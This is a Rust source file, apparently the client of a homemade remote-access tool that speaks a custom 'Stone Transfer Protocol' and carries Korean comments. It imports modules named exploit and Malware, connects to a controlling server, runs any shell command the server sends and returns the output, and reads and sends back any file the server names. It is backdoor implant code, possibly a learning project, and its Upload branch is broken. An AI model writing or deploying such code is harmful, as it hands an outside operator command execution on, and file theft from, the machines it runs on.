mod exploit;
mod stprotocol;
mod structure;

use exploit::{Exploits, Malware};
use std::env;
use std::fs::File;
use std::io::{Read, Write};
use std::path::Path;
use stprotocol::{Client, Session};
use structure::{Detector, Generator, StoneTransferProtocol, StructStone, StructStonePayload};

fn main() {
    let mut exploit = Exploits::default();
    event_loop(
        Session::new("127.0.0.1:6974".to_string()),
        StructStone::default(),
        exploit,
    )
}

fn event_loop(mut client: Session, mut packet: StructStone, mut exploit: Exploits) {
    let mut ex = Exploits::default();
    loop {
        // 새션 생성후 서버와 지속적인 통신을 위한 루프문

        packet = client.receiving(StructStone::default()); // 연결요청후 서버의 응답 대기

        println!("서버 응답타입: {:?}", packet.header_type());

        match packet.header_type() {
            // 서버의 응답 타입을 비교하여 보낼 요청을 생성함
            StoneTransferProtocol::ExecuteCmd => {
                // 타입이 Request 일 경우
                ex = exploit
                    .command(packet.get_command(), ex.get_last_cmd())
                    .execute();
                client.send(
                    StructStonePayload::new(vec![], ex.get_output(), vec![])
                        .to_stone()
                        .stone,
                ) // 생성한 응답을 전송
            }
            StoneTransferProtocol::Download => {
                // 타입이 Download 일 경우
                match String::from_utf8(packet.get_file()) {
                    Ok(ok) => client.send(handle_download(&ok).stone),
                    Err(_) => client.send_msg("File Not Found"),
                }
            }
            StoneTransferProtocol::Upload => {
                // 타입이 Upload 일 경우
                match String::from_utf8(packet.get_file()) {
                    Ok(ok) => client.send(handle_download(&ok).stone),
                    Err(_) => client.send_msg("File Not Found"),
                }
            }
            StoneTransferProtocol::Disconnect => {
                client.disconnect();
                break;
            } // 만약 서버의 응답이 Disconnect 일 경우 연결을 종료한다

            _ => client.send(packet.stone), //만약 위의 응답 타입을 제외한 응답을 보낼경우 서버의 응답과 같은 요청을 전송함
        };
    }
}

fn handle_download(path: &String) -> StructStone {
    let mut open_file = match File::open(path.replace("\\", "/")) {
        Ok(file) => file,
        Err(error) => {
            return StructStonePayload::new(vec![], vec![], b"File Not Found".to_vec()).to_stone();
        }
    };
    let mut file = vec![];

    match open_file.read_to_end(&mut file) {
        Ok(ok) => ok.to_le_bytes().to_vec(),
        Err(error) => b"File Not Found".to_vec(),
    };

    StructStonePayload::new(vec![], vec![], file).to_stone()
}

// fn handle_upload(mut file: Vec<u8>) -> StructStone {
//     let path = std::env::current_dir();
//     let mut open_file = File::open(path).expect("File Not Found");
//
//     let file = match open_file.write_all(&mut file) {
//         Ok(_) => format!("File {:?} upload successful", path,).to_vec(),
//         Err(_) => b"File Not Found".to_vec(),
//     };
//
//     StructStonePayload::new(vec![], vec![], file).to_stone()
// }
